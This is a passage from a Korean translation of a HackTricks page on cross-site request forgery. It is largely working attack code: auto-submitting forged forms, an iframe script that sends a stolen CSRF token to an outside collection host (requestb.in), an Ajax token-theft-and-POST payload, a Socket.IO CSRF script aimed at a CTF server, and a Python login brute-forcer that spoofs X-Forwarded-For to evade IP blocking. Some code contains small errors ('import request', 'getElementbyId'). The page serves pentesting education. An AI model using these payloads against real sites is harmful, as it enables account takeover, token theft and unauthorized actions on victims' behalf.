document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **토큰을 도용하고 2개의 iframe을 사용하여 전송하기**

One way to perform a CSRF attack is by stealing the victim's authentication token and sending it using two iframes. This attack can be executed in the following steps:

1. The attacker creates a malicious website that contains two iframes.
2. The first iframe is loaded with the target website's login page.
3. The second iframe is loaded with a page on the attacker's website that contains a form to perform a specific action on the target website.
4. When the victim visits the malicious website, the first iframe automatically submits the login form using the victim's credentials.
5. Once the victim is logged in, the second iframe automatically submits the form on the attacker's website, which includes the stolen authentication token.
6. The target website receives the request with the stolen token, considering it as a legitimate request from the victim.
7. The action specified in the form on the attacker's website is performed on the target website, potentially leading to unauthorized actions or data leakage.

To prevent this type of attack, web developers should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict access controls.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajax를 사용하여 CSRF 토큰을 도용하고 폼을 통해 POST 요청 보내기**

To perform a Cross-Site Request Forgery (CSRF) attack, you can use Ajax to steal the CSRF token and then send a POST request using a form.

CSRF attacks exploit the trust that a website has in a user's browser. By tricking the browser into making a request on behalf of the user, an attacker can perform actions without the user's knowledge or consent.

To steal the CSRF token, you can use Ajax to make a GET request to the target website's endpoint that returns the token. Once you have the token, you can then use it to craft a POST request.

Here's an example of how you can accomplish this:

```javascript
// Step 1: Steal the CSRF token using Ajax
var xhr = new XMLHttpRequest();
xhr.open('GET', '/endpoint-that-returns-csrf-token', true);
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var csrfToken = xhr.responseText;

    // Step 2: Craft the POST request with the stolen CSRF token
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/endpoint-to-submit-form';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'csrf_token';
    input.value = csrfToken;
    
    form.appendChild(input);
    document.body.appendChild(form);
    
    form.submit();
  }
};
xhr.send();
```

In this example, the Ajax request is made to the `/endpoint-that-returns-csrf-token` endpoint, which should return the CSRF token as a response. Once the token is obtained, a new form is created with the necessary input fields, including the stolen CSRF token. Finally, the form is submitted, triggering the POST request with the stolen token.

It's important to note that CSRF attacks can be prevented by implementing proper CSRF protection mechanisms, such as using anti-CSRF tokens, checking the origin of requests, and implementing SameSite cookies.
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IO를 이용한 CSRF

Socket.IO는 웹 애플리케이션에서 실시간 양방향 통신을 가능하게 하는 JavaScript 라이브러리입니다. 이 라이브러리를 사용하여 CSRF(Cross-Site Request Forgery) 공격을 수행할 수도 있습니다.

CSRF 공격은 인증된 사용자의 권한을 이용하여 악의적인 요청을 보내는 공격입니다. 이를 통해 공격자는 사용자의 계정을 이용하여 악의적인 동작을 수행할 수 있습니다.

Socket.IO를 이용한 CSRF 공격은 다음과 같은 단계로 이루어집니다:

1. 공격자는 악성 웹 페이지를 생성하여 Socket.IO 클라이언트를 포함시킵니다.
2. 악성 웹 페이지를 피해 웹 애플리케이션에 접속한 사용자는 Socket.IO 클라이언트를 다운로드하고 실행합니다.
3. Socket.IO 클라이언트는 웹 애플리케이션과의 연결을 설정하고 인증 토큰을 받습니다.
4. 공격자는 악성 요청을 포함한 Socket.IO 패킷을 생성합니다.
5. 악성 요청을 포함한 Socket.IO 패킷을 웹 애플리케이션에 전송합니다.
6. 웹 애플리케이션은 Socket.IO 패킷을 처리하고 악성 요청을 실행합니다.

이렇게 하면 공격자는 사용자의 인증된 세션을 이용하여 악의적인 동작을 수행할 수 있습니다. 따라서 웹 애플리케이션 개발자는 Socket.IO를 사용할 때 CSRF 공격에 대비하여 적절한 보호 메커니즘을 구현해야 합니다.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF 로그인 브루트 포스

이 코드는 CSRF 토큰을 사용하여 로그인 폼을 브루트 포스할 수 있습니다 (또한 가능한 IP 블랙리스트 우회를 위해 헤더 X-Forwarded-For를 사용합니다):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## 도구 <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## 참고 자료

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

경험 많은 해커와 버그 바운티 헌터와 소통하기 위해 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 가입하세요!

**해킹 통찰력**\
해킹의 스릴과 도전을 다루는 콘텐츠에 참여하세요.

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계를 따라가세요.

**최신 공지사항**\
새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대한 정보를 받아보세요.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**에 가입하여 최고의 해커들과 협업을 시작하세요!

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**로부터 AWS 해킹을 처음부터 전문가까지 배워보세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
